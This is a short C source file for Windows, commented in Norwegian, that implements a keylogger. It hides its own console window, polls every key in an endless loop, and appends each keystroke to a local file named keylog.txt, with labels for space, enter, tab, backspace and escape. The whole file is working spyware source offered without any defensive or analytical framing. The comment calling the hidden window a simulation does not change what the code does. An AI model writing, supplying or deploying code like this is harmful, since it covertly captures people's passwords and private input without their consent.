#include <stdio.h>
#include <stdlib.h>
#include <windows.h>

// Funksjon som registrerer tastetrykk
int logKey(int key, const char *filename) {
    FILE *file;
    file = fopen(filename, "a+"); // Åpner filen for å legge til data

    if (!file) {
        return 1; // Returnerer feil hvis filen ikke kan åpnes
    }

    // Sjekker spesialtaster og skriver dem på en forståelig måte
    if (key == VK_SPACE)
        fprintf(file, " [SPACE] ");
    else if (key == VK_RETURN)
        fprintf(file, " [ENTER] ");
    else if (key == VK_TAB)
        fprintf(file, " [TAB] ");
    else if (key == VK_BACK)
        fprintf(file, " [BACKSPACE] ");
    else if (key == VK_ESCAPE)
        fprintf(file, " [ESC] ");
    else if (key >= 32 && key <= 126)
        fprintf(file, "%c", key); // Vanlige tegn

    fclose(file); // Lukker filen
    return 0;
}

int main() {
    const char *filename = "keylog.txt"; // Filen som lagrer tastetrykkene

    // Skjuler konsollvinduet for å simulere keyloggeren
    HWND hwnd = GetConsoleWindow();
    ShowWindow(hwnd, SW_HIDE);

    // Uendelig løkke som sjekker tastetrykk
    while (1) {
        for (int key = 8; key <= 190; key++) { // Tastkoder for relevante taster
            if (GetAsyncKeyState(key) & 0x0001) { // Sjekker om tasten trykkes
                logKey(key, filename); // Logger tasten
            }
        }
        Sleep(10); // Pause for å redusere prosessorbruk
    }

    return 0;
}

